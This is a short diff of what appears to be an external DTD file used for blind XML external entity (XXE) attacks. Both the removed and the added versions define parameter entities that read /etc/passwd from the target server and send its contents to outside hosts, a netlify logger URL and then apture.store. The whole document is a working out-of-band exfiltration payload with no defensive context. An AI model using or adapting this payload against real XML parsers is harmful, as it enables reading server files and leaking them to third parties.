@@ -1,3 +1,5 @@
-<!ENTITY % payload SYSTEM "file:///etc/passwd">
-<!ENTITY % param "<!ENTITY send SYSTEM 'https://kceedom.netlify.app/.netlify/functions/logger/?data=%payload;'>">
-%param;
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://www.apture.store/?data=%file;'>">
+%eval;
+%exfil;
